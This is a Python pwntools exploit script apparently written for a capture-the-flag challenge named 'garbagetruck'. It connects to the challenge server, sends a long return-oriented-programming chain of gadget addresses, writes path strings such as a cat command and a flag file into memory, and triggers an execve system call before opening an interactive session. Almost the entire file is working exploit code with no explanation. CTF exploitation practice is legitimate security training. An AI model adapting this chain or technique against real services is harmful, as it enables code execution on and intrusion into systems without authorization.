from pwn import *

#r = process(["./garbagetruck"])
r = remote("garbagetruck.chal.pwning.xxx",6349)

for _ in range(27):
	r.sendlineafter(">","2")

data = [
0x00000000004b232f, #: test eax, eax ; je 0x4b2348 ; mov rax, rbx ; pop rbx ; ret
0x7461632f6e69624f,
0x00000000004b232f,
0x2,
0x0000000000403043, #: pop rdi ; ret
0x757d09,
0x0000000000424133, #: mov qword ptr [rdi], rax ; ret

0x00000000004b232f,
0x6e69622f2f2f2f35,
0x00000000004b232f, #: test eax, eax ; je 0x4b2348 ; mov rax, rbx ; pop rbx ; ret
0x2,
0x0000000000403043, #: pop rdi ; ret
0x757d05,
0x0000000000424133, #: mov qword ptr [rdi], rax ; ret



0x00000000004b232f,
0x7478742e67616c75,
0x00000000004b232f, #: test eax, eax ; je 0x4b2348 ; mov rax, rbx ; pop rbx ; ret
0x2,
0x0000000000403043, #: pop rdi ; ret
0x757d45,
0x0000000000424133, #: mov qword ptr [rdi], rax ; ret

0x00000000004b232f,
0x67616c662f2f2fab,
0x00000000004b232f, #: test eax, eax ; je 0x4b2348 ; mov rax, rbx ; pop rbx ; ret
0x2,
0x0000000000403043, #: pop rdi ; ret
0x757d41,
0x0000000000424133, #: mov qword ptr [rdi], rax ; ret



0x00000000004b232f,
0x757d09,
0x00000000004b232f, #: test eax, eax ; je 0x4b2348 ; mov rax, rbx ; pop rbx ; ret
0x2,
0x0000000000403043, #: pop rdi ; ret
0x757d75,
0x0000000000424133, #: mov qword ptr [rdi], rax ; ret

0x00000000004b232f,
0x757d45,
0x00000000004b232f, #: test eax, eax ; je 0x4b2348 ; mov rax, rbx ; pop rbx ; ret
0x2,
0x0000000000403043, #: pop rdi ; ret
0x757d7d,
0x0000000000424133, #: mov qword ptr [rdi], rax ; ret












0x00000000004a2295, #: pop rsi ; pop rbp ; ret
0x757d1b,
0x2,
0x000000000040259b, #: add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x2,
0x2,
0x0000000000403043, #: pop rdi ; ret
0x2,
0x2,
0x00000000004b232f, #: test eax, eax ; je 0x4b2348 ; mov rax, rbx ; pop rbx ; ret
0x2,
0x0000000000498517, #: mov ecx, esp ; mov rdi, r13 ; mov rdx, rsi ; call rax


0x000000000040259b, #: add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x2,
0x2,
0x757d1b,
0x2,
0x2,
0x00000000004b232f, #: test eax, eax ; je 0x4b2348 ; mov rax, rbx ; pop rbx ; ret
0x2,
0x00000000004892bf, #: add byte ptr [rax], al ; add al, ch ; pop rcx ; ret
0x2,
0x000000000040259b, #: add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x2,
0x2,
0x5073c5,
0x2,
0x2,
0x00000000004b232f, #: test eax, eax ; je 0x4b2348 ; mov rax, rbx ; pop rbx ; ret
0x2,
0x000000000049bdbd, #: add rsp, 8 ; sub eax, 1 ; ret
0x2,
0x000000000049bdbd, #: add rsp, 8 ; sub eax, 1 ; ret
0x2,
0x000000000049bdbd, #: add rsp, 8 ; sub eax, 1 ; ret
0x2,
0x000000000049bdbd, #: add rsp, 8 ; sub eax, 1 ; ret
0x2,
0x0000000000493ba9, #: xchg rax, rbp ; or eax, dword ptr [rdx - 6] ; ret
0x0000000000453a87, #: add ecx, ebp ; ret
0x0000000000403043, #: pop rdi ; ret
0x757d09,
0x000000000040259b, #: add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x2,
0x2,
0x3b,
0x2,
0x2,
0x00000000004b232f, #: test eax, eax ; je 0x4b2348 ; mov rax, rbx ; pop rbx ; ret
0x2,
0x00000000004a2295, #: pop rsi ; pop rbp ; ret
0x757d75,
0x2,
0x000000000050ba3f #: push rcx ; cdq ; ret

]



for val in data:
	r.sendlineafter(">",str(val))


r.sendlineafter(">","0")
r.interactive()
